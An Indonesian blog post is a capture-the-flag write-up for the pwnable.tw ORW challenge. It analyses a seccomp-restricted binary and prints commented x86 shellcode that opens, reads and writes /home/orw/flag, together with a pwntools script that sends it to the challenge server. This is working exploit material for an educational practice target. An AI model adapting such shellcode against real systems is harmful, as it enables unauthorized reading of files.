---
layout: page
title: "Menyelesaikan Challenge pwnable.tw: ORW"
categories: ctf pwn assembly
---

<div class="post-categories">
  {% if post %}
    {% assign categories = post.categories %}
  {% else %}
    {% assign categories = page.categories %}
  {% endif %}
  <strong>Categories: </strong>
  {% for category in categories %}
  <a href="{{site.baseurl}}/categories/#{{category|slugize}}">{{category}}</a>
  {% unless forloop.last %}, {% endunless %}
  {% endfor %}
</div>

Pada blog ini, saya akan membagikan bagaimana saya mengerjakan challenge ORW pada [pwnable.tw](https://pwnable.tw){: target="_blank"}

![Soal ORW](/assets/img/Screenshot 2025-05-29 115041.png)

Dari soalーdiberikan detail yang cukup jelas, _read flag from_ `/home/orw/flag` dan _only_ `open` `read` `write` _syscall are allowed to use_

Oke, langsung saja kita download binary yang telah diberikanーdan lihat bagaimana detail file binary-nya dan isi setiap fungsinya pada ghidra

![Detail binary ORW](/assets/img/Screenshot 2025-05-29 144813.png) |

![Hasil decompile Ghidra: fungsi main](/assets/img/Screenshot 2025-05-29 120017.png){: style="display:block; margin-left: auto; margin-right: auto;"} | ![Hasil decompile Ghidra: fungsi orw_seccomp](/assets/img/Screenshot 2025-05-29 120054.png)

Sangat simpel dan _straight-forward_ sekali yak, kita bisa abaikan aja fungsi orw_seccomp, karena saya ga tau itu gimana cara bacanya😅 yang pasti itu sepertinya buat filter semua syscall kecuali `open` `read` `write` dan apabila selain ke-3 syscall ini yang dipanggil, maka `return -1` (bisa dilihat pada man page prctl)

![Apa itu seccomp](/assets/img/Screenshot 2025-05-29 125730.png) | ![Man page prctl](/assets/img/Screenshot 2025-05-29 125632.png)

| ![Hasil check seccomp-tools](/assets/img/Screenshot 2025-05-29 130533.png){: style="display:block; margin-left: auto; margin-right: auto;"}

Terlihat pada seccomp-tools apa2 saja syscall yang dibolehkanーjadi intinya kita diminta _craft shellcode_ dan mengambil flag pada `/home/orw/flag` hanya dengan menggunakan `open` `read` `write` syscall

Oke, langsung saja kita craft sesuai dengan keinginan binary~

```asm
    xor eax, eax        ; Membersihkan eax register (nilai menjadi 0)
    push eax            ; Menambahkan null terminator ke dalam stack

    ; Memasukkan /home/orw/flag ke dalam stack pointer (esp) dengan little-endian byte order
    push 0x00006761     ; 'a', 'g', '\x00', '\x00'
    push 0x6c662f77     ; 'w', '/', 'f', 'l'
    push 0x726f2f65     ; 'e', '/', 'o', 'r'
    push 0x6d6f682f     ; '/', 'h', 'o', 'm'
    ; Jadi hasilnya adalah "/home/orw/flag" di stack lengkap dengan null terminator

    ; Open syscall dengan arguments open("/home/orw/flag", 0, 0)
    mov eax, 0x5        ; 0x5 pada eax untuk memanggil open pada syscall
    mov ebx, esp        ; memasukkan esp (yang berisi path file) sebagai argumen pertama
    xor ecx, ecx        ; argumen kedua: flag O_RDONLY (dengan value 0)
    xor edx, edx        ; argumen ketiga: mode (tidak digunakan, set ke 0)
    int 0x80            ; software interrupt untuk syscall

    mov esi, eax        ; menyimpan file descriptor hasil open ke dalam register esi

    sub esp, 0x32       ; menyediakan 0x32 (50) bytes buffer pada stack
    mov ebp, esp        ; mengisi base pointer dengan stack pointer sebagai alamat buffer

    ; Read syscall dengan arguments read(fd, buf, sizeof(buf))
    mov eax, 0x3        ; 0x3 pada eax untuk memanggil read pada syscall
    mov ebx, esi        ; membaca isi file descriptor (fd) dari open sebagai argumen pertama
    mov ecx, ebp        ; buffer di stack sebagai argumen kedua
    mov edx, 0x32       ; panjang buffer (50 bytes) sebagai argumen ketiga
    int 0x80            ; software interrupt untuk syscall

    ; Write syscall dengan arguments write(1, buf, sizeof(buf))
    mov eax, 0x4        ; 0x4 pada eax untuk memanggil write pada syscall
    mov ebx, 0x1        ; 0x1 merupakan file descriptor untuk stdout (/dev/fd/1) sebagai argumen pertama
    mov ecx, ebp        ; buffer string yang akan di-print sebagai argumen kedua
    mov edx, 0x32       ; panjang buffer sebagai argumen ketiga
    int 0x80            ; software interrupt untuk syscall
```

![x86 syscalls untuk open read write](/assets/img/Screenshot 2025-05-29 141828.png)

Untuk syscall lainnya selain `open` `read` `write` bisa dicek di [syscall.sh](https://syscall.sh){: target="_blank"} ya!!

Oke, begitu aja assembly yang akan kita gunakan untuk mendapatkan flag dari challenge ORW ini, sekarang kita jalankan pada python menggunakan library `pwntools`

```python
#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("./orw")

context.arch = "i386"
context.binary = exe
context.terminal = ["xterm", "-e"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10001)

    return r


def write(file, val):
    with open(file, "wb") as f:
        f.write(val)


def main():
    # good luck pwning :)
    r = conn()

    with log.progress("Inject shellcode") as l:

        shellcode = asm('''
            xor eax, eax
            push eax
            
            push 0x00006761
            push 0x6c662f77
            push 0x726f2f65
            push 0x6d6f682f

            mov eax, 0x5
            mov ebx, esp
            xor ecx, ecx 
            xor edx, edx
            int 0x80

            mov esi, eax

            sub esp, 0x32
            mov ebp, esp

            mov eax, 0x3
            mov ebx, esi
            mov ecx, ebp
            mov edx, 0x32
            int 0x80

            mov eax, 0x4
            mov ebx, 0x1
            mov ecx, ebp
            mov edx, 0x32
            int 0x80
        ''')
        r.recv()
        r.send(shellcode)
        l.success()

    r.interactive()


if __name__ == "__main__":
    main()
```

Maka akan didapatlah flagnya!!

Semoga bermanfaat, mohon maaf jika ada salah penyampaian, dan terima kasih telah membaca!
